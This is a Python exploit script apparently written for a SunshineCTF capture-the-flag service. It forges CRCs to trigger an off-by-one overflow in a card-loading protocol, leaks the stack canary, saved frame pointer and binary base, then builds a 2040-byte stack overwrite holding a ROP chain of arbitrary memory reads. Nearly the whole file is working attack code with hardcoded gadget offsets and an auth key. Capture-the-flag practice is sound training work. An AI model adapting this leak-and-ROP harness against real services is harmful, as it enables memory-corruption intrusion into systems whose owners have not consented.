#!/usr/bin/env python
"""Homemaker exploit library: framed protocol + off-by-one -> stack leak -> ROP harness.

The card loader at 0x174c copies `n+1` bytes (inclusive loop) where n = payload_len-1,
guarded only by `n > capacity`. Two consequences:

  * with capacity=0x100 a 257-byte payload writes mem[256] = the frame's own CRC byte,
    which we steer to 0xFF -> capacity becomes 0x1FF;
  * a 512-byte card can then plant capacity = 0x7F8 (mem[0x100..0x101] is inside the
    written range), and read_frame accepts payloads up to 0x7F9 bytes (len+7 <= 0x800),
    so one card overwrites mem[0..0x7F8] -- 2041 bytes of the dispatcher's stack frame.

0x1810(ctx) emits `[ctx+0x100]` bytes starting at ctx (guard: len <= 0x7F8), so with
ctx under ROP control it is an arbitrary read primitive whose *length* is whatever the
two bytes 0x100 past ctx happen to hold. That is the only constraint on what we can read.
"""
import re
import socket
import struct
import sys

HOST = "sunshinectf.games"
PORT = 26008

KEY = 0x1337C35F
POP_RDI = 0x12AA          # pop rdi ; ret
RET = 0x101A              # ret
READFN = 0x1810           # emit(0, rdi, [rdi+0x100])
GOT_CTX = 0x3F90          # [ctx+0x100] lands in the emit buffer -> GOT/.data/.bss read
RETADDR_OFF = 0x1A9F      # mem[0x118] = base + 0x1a9f (return from main's call)
MEM_FROM_RBP = 0x130      # mema = saved_rbp - 0x130  (verified against the live leak)

MAXCAP = 0x7F8
FLAG_RE = re.compile(rb"sun\{[^{}\s]{1,120}\}")


def crc8(data):
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2F) & 0xFF if acc & 0x80 else (acc << 1) & 0xFF
    return acc


def frame(payload):
    return b"\x1b[" + struct.pack(">H", len(payload)) + payload + bytes([crc8(payload)]) + b"\x1b\\"


def with_crc(payload, want):
    """Flip the last payload byte until crc8(payload) == want (the off-by-one byte)."""
    for x in range(256):
        p = bytearray(payload)
        p[-1] = x
        if crc8(bytes(p)) == want:
            return bytes(p)
    raise RuntimeError("no crc fixpoint")


p64 = lambda v: struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
u64 = lambda b: struct.unpack("<Q", b)[0]


class Servant:
    """One connection; stateless server, so build a fresh leak per connection."""

    def __init__(self, host=HOST, port=PORT, timeout=15):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.buf = b""
        self._banner()

    def _banner(self):
        self.s.settimeout(2.0)
        out = b""
        try:
            while b"SERVICE KEY CARD" not in out.upper() and len(out) < 4000:
                c = self.s.recv(1024)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        self.buf = out
        return out

    # ---- framing -------------------------------------------------------
    def parse_frames(self):
        out = []
        while True:
            i = self.buf.find(b"\x1b[")
            if i < 0 or len(self.buf) < i + 7:
                return out
            ln = struct.unpack(">H", self.buf[i + 2:i + 4])[0]
            end = i + 4 + ln + 3
            if len(self.buf) < end:
                return out
            body = self.buf[i + 4:i + 4 + ln]
            out.append((body, crc8(body) == self.buf[i + 4 + ln]))
            self.buf = self.buf[end:]

    def one(self, timeout=6.0):
        """First complete frame, reading only as much as that needs."""
        self.s.settimeout(timeout)
        f = self.parse_frames()
        while not f:
            try:
                c = self.s.recv(65536)
            except OSError:
                break
            if not c:
                break
            self.buf += c
            f = self.parse_frames()
        return f[0] if f else (None, False)

    def drain_frames(self, timeout=9.0):
        """Read until the process dies (EOF) or goes quiet, then return every frame."""
        self.s.settimeout(timeout)
        try:
            while True:
                c = self.s.recv(65536)
                if not c:
                    break
                self.buf += c
                if len(self.buf) > 4 << 20:
                    break
        except OSError:
            pass
        return self.parse_frames()

    # ---- protocol ------------------------------------------------------
    def auth(self):
        self.s.sendall(frame(bytes([1]) + struct.pack(">I", KEY)))
        b, ok = self.one()
        return b == b"\x00"

    def cmd(self, payload, timeout=6.0):
        self.s.sendall(frame(payload))
        return self.one(timeout)

    # ---- leak ----------------------------------------------------------
    def leak(self):
        """Off-by-one -> capacity 0x1FF -> dump 511 bytes of the dispatcher frame."""
        self.s.sendall(frame(with_crc(bytes([2]) + b"A" * 256, 0xFF)))
        self.one()
        b, ok = self.cmd(b"\x03", timeout=8.0)
        if not b or not ok or len(b) < 0x120:
            raise RuntimeError("leak failed: %r" % (b[:20] if b else None,))
        mem = b[1:]
        self.canary = mem[0x108:0x110]
        self.saved_rbp = u64(mem[0x110:0x118])
        self.retaddr = u64(mem[0x118:0x120])
        self.base = self.retaddr - RETADDR_OFF
        self.mema = self.saved_rbp - MEM_FROM_RBP
        self.dump0 = mem
        return self.base

    # ---- big card ------------------------------------------------------
    def bump_capacity(self, cap=MAXCAP, extra=()):
        """512-byte card: restores canary/rbp, rewrites capacity to `cap`.

        `extra` patches land inside the same card, e.g. mem[0x2b..0x2c]=f7 07 so that the
        next dump copies 0x07f7 into base+0x4090 -- the length gate for a GOT read.
        """
        d = bytearray(b"." * 0x100)
        d += struct.pack("<H", cap) + b"\x00\x00" + b"\x00" * 4
        d += self.canary
        d += p64(self.saved_rbp)
        d = bytearray(bytes(d) + b"\x00" * (511 - len(d)))
        for off, val in extra:
            d[off:off + len(val)] = val
        self.s.sendall(frame(with_crc(bytes([2]) + bytes(d), 0x00)))
        b, _ = self.one()
        return b

    def big_card_and_run(self, data2040, trigger=b"\x00\x01\x02\x03", drain=8.0):
        """Write mem[0..0x7F7] = data2040 (mem[0x7F8] = crc), then break framing to run the chain.

        The dispatcher only leaves its loop when read_frame returns < 0, so the trigger is
        four bytes that are not a 0x1b5b header; the resulting status frame is the first
        thing collected, ahead of whatever the chain emits.
        """
        assert len(data2040) == MAXCAP
        self.s.sendall(frame(with_crc(bytes([2]) + data2040, 0x00)))
        self.one()
        self.s.sendall(trigger)
        return self.drain_frames(timeout=drain)


def build_card(mema, canary, saved_rbp, chain_at_0x118, filler=b"\x00", extra=()):
    """Compose the 2040-byte mem image: metadata restored + payload + ROP chain at 0x118."""
    d = bytearray(filler * MAXCAP)
    d[0x100:0x102] = struct.pack("<H", MAXCAP)
    d[0x102:0x104] = b"\x00\x00"
    d[0x108:0x110] = canary
    d[0x110:0x118] = p64(saved_rbp)
    assert len(chain_at_0x118) <= MAXCAP - 0x118, "chain too long"
    d[0x118:0x118 + len(chain_at_0x118)] = chain_at_0x118
    for off, val in extra:
        d[off:off + len(val)] = val
    return bytes(d)


def rop_reads(base, ctxs):
    """[pop rdi; ret][ctx][0x1810] repeated -- one bounded memory read per ctx."""
    c = bytearray()
    for x in ctxs:
        c += p64(base + POP_RDI) + p64(x) + p64(base + READFN)
    return bytes(c)


def setup(host=HOST, port=PORT, verbose=True):
    """Auth, leak the frame, bump capacity to 0x7f8, return (servant, 2041-byte stack dump).

    The bump card also plants 0x07f7 at mem[0x2b], so after this dump every later
    0x1810(base+0x3f90) reads 2039 bytes of .got/.data/.bss.
    """
    s = Servant(host, port)
    if not s.auth():
        raise RuntimeError("auth failed")
    s.leak()
    s.bump_capacity(extra=[(0x2B, b"\xf7\x07")])
    b, ok = s.cmd(b"\x03", timeout=9.0)
    if not b or len(b) - 1 != MAXCAP:
        raise RuntimeError("dump after bump gave %s bytes" % (None if b is None else len(b) - 1))
    if verbose:
        print("[+] base=%#x mema=%#x canary=%s (dump %d bytes, crc ok=%s)"
              % (s.base, s.mema, s.canary.hex(), len(b) - 1, ok))
    return s, b[1:]
